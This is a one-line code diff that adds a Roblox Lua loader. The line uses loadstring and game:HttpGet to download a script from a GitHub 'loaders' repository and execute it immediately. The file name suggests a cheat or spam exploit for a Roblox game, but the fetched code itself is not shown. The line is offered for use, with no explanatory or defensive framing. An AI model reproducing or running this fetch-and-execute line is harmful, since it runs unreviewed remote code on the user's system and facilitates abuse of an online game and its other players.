@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/a-long-flight-sandbox-spam6-7in5rq05o89t52.lua"))()
